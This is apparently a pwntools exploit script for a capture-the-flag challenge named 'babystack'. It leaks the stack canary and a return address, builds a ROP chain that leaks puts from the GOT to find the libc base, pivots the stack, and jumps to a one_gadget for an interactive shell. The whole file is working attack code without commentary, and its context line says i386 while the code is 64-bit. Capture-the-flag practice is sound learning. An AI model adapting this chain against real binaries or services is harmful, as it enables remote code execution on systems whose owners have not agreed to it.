#!/usr/bin/python3
from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
# fsb(width, offset, data, padding, roop)
# sop()
# fake_file()

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./share/babystack"
#"""
HOST = "chall.ctf.bamboofox.tw"
PORT = 10102 
"""
HOST = "localhost"
PORT = 7777 
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
	libc = ELF('./libc.so.6')
else:
	conn = process(FILE_NAME)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

elf = ELF(FILE_NAME)
addr_main = 0x401379
addr_read_name = 0x40131d
addr_check_db = 0x401237
addr_read_str12 = 0x401182

rdi_ret = 0x4014bb
only_ret = 0x401016
rbp_ret = 0x401169
leave_ret = 0x401235
got_puts = elf.got["puts"]
plt_puts = elf.plt["puts"]
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']
#
#libc = ELF('./')
off_puts = libc.symbols["puts"]
gadget = [0x106ef8]

def exploit():
	conn.sendlineafter("Name: \n", "pokemon")	
	conn.sendafter("token: \n", "A"*0x10)	
	conn.sendafter("str1:", "A"*8+"B")
	conn.recvuntil("AB")
	canary = u64(b"\x00"+conn.recv(7))
	conn.sendafter("str2:", "A"*(6)+"C")
	conn.recvuntil("AC")
	ret_to_main = u64(conn.recv(6)+b"\x00\x00") +0x8
	
	payload = p64(0)
	payload += p64(rdi_ret)
	conn.sendafter("str1:", payload)
	payload = p64(got_puts)
	payload += p64(plt_puts) #libc leak
	payload += p64(only_ret)
	payload += p64(addr_main+1)
	payload += p64(only_ret)
	payload += p64(canary)
	payload += p64(ret_to_main+0x50)
	print(hex(canary))
	print(hex(ret_to_main))
	conn.sendafter("str2:", payload)
	
	payload = p64(rbp_ret)
	payload += p64(ret_to_main-0x48)
	payload += p64(leave_ret)
	conn.send(payload)
	conn.recvuntil("@\n")
	libc_puts = u64(conn.recv(6)+b"\x00\x00")
	libc_base = libc_puts - off_puts
	one_gadget = libc_base + gadget[0]
	print(hex(libc_base))
	
	# second main()
	ret_to_main = ret_to_main - 0x80
	
	conn.sendlineafter("Name: \n", "pokemon")	
	conn.sendafter("token: \n", "A"*0x10)	
	conn.sendafter("str1:", "A"*8+"\n")
	conn.sendafter("str2:", "A"*8+"\n")

	payload = p64(0)
	payload += p64(one_gadget)
	conn.sendafter("str1:", payload)
	payload = p64(only_ret)*5
	payload += p64(canary)
	payload += p64(ret_to_main+0x50)
	conn.sendafter("str2:", payload)
	
	payload = p64(rbp_ret)
	payload += p64(ret_to_main-0x48)
	payload += p64(leave_ret)
	conn.send(payload)

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
